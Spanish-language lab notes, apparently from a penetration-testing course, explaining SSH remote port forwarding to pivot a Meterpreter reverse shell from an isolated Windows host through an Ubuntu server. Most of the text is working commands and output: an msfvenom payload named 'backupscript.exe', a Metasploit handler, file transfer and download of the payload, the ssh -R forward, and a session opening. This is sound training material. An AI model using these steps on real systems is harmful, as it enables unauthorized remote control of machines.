> Hemos visto el reenvío de puertos local, donde SSH puede escuchar en nuestra máquina local y reenviar un servicio del host remoto a nuestro puerto, y el reenvío de puertos dinámico, donde podemos enviar paquetes a una red remota a través de un host pivote. Pero a veces, también podríamos querer reenviar un servicio local a un puerto remoto. Consideremos el escenario en el que podemos conectarnos por RDP al host Windows A. Como se puede ver en la imagen inferior, en nuestro caso anterior, pudimos pivotar hacia el host Windows a través del servidor Ubuntu.


![[reverse_port_forwarding.png | 800]]

***¿Qué ocurre si intentamos obtener una reverse shell?***

La conexión saliente del host Windows está limitada únicamente a la red 172.16.5.0/23. Esto se debe a que el host Windows no tiene ninguna conexión directa con la red en la que se encuentra el equipo de ataque. Si iniciamos un listener de Metasploit en nuestro equipo atacante e intentamos obtener una reverse shell, no podremos establecer una conexión directa porque el servidor Windows no sabe cómo enrutar el tráfico que sale de su red (172.16.5.0/23) para alcanzar la 10.129.x.x (la red del laboratorio de Academy).

Durante una auditoría de penetración, hay muchas ocasiones en las que disponer únicamente de una conexión de escritorio remoto no es suficiente. Es posible que queramos subir o descargar archivos (cuando el portapapeles de RDP está deshabilitado), utilizar exploits o acceder a API de bajo nivel de Windows mediante una sesión de Meterpreter para realizar tareas de enumeración en el host Windows, lo cual no es posible utilizando únicamente los ejecutables nativos de Windows.

En estos casos, debemos identificar un host de pivote, que actúe como punto de conexión común entre nuestro equipo de ataque y el servidor Windows. En nuestro caso, ese host pivote será el servidor Ubuntu, ya que puede conectarse tanto con nuestro equipo de ataque como con el objetivo Windows. Para obtener una shell de Meterpreter en el sistema Windows, crearemos un payload HTTPS de Meterpreter usando `msfvenom`, pero la configuración de conexión inversa del payload tendrá como dirección IP la del servidor Ubuntu (172.16.5.129). Utilizaremos el puerto 8080 en el servidor Ubuntu para redirigir todos los paquetes inversos hacia el puerto 8000 de nuestro equipo atacante, donde estará activo el listener de Metasploit.

##### Creando un payload Windows con msfvenom

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

##### Configurando y empezando el multi/handler

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

Una vez que nuestro payload es creado y tenemos nuestro listener configurado y corriengo, podemos copiar el payload al servidor Ubuntu usando el comando `scp` puesto que ya tenemos las credenciales para conectarnos al servidor Ubuntu usando SSH

##### Transfiriendo el payload al host pivote

```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget:

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

> *No olvidar añadir `:` para meterlo en el home*

Después de copiar el payload, comenzamos como siempre un servidor local python3 en el puerto que queramos para después pasárselo al Windows remoto:

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

##### Descargando el payload en el objetivo Windows

Lo hacemos con un navegador web, o más fácil aún, usando `Invoke-WebRequest`:

```powershell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Una vez que hayamos descargado el payload en el host Windows, utilizaremos el reenvío de puertos remoto por SSH (SSH remote port forwarding) para redirigir las conexiones desde el puerto 8080 del servidor Ubuntu hacia el servicio de escucha (listener) de nuestra `msfconsole` en el puerto 8000.

Usaremos el argumento `-vN` en el comando SSH para activar el modo detallado (verbose) y evitar que se inicie una shell interactiva tras la conexión. El parámetro `-R` le indica al servidor Ubuntu que escuche en `<IP_del_objetivo>:8080` y que reenvíe todas las conexiones entrantes en ese puerto hacia el puerto 8000 de nuestro equipo atacante (`0.0.0.0:8000`), donde está activo el listener de Metasploit.

##### Usando SSH -R

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Después de crear el port forward remoto SSH, podemos ejecutar el payload desde la máquina Windows objetivo. Si el payload es ejecutado como fue intencionado e intenta conectarnos de vuelta a nuestro listener, podemos ver los logs del pivote al host pivote

```shell-session
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

Si todo ha ido bien, recibiremos una shell Meterpreter pivotada vía servidor Ubuntu.

##### Sesión Meterpreter establecida

```shell-session
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Nuestra sesión Meterpreter debería listar nuestra conexión entrante desde un localhost por sí misma (127.0.0.1), dado que estamos recibiendo nuestra conexión sobre el socket SSH local, que creó una conexión `outbound` al servidor Ubuntu. De manera gráfica:

![[reverse_port_forwarding3.png | 800]]